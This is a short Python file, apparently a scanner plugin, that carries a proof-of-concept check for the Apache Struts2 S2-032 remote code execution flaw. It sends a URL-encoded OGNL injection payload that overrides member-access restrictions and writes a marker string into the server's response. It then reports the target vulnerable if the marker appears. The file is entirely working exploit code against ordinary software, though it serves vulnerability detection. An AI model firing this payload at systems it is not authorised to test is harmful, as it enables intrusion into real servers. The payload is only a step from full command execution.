__author__ = 'luhaoliang'
"""
Struts2 S2-032远程代码执行漏洞PoC

"""

import requests

def poc(target):
    flag = 'Struts2 S2-032 Vulnerable'
    url = target+"?method:%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%2C%23test%3D%23context.get%28%23parameters.res%5B0%5D%29.getWriter%28%29%2C%23test.println%28%23parameters.command%5B0%5D%29%2C%23test.flush%28%29%2C%23test.close&res=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=%23%23%23Struts2 S2-032 Vulnerable%23%23%23"
    try:
        res = requests.get(url)
        if flag in res.text:
            return [1,flag]

    except:
        pass
    return [0,flag]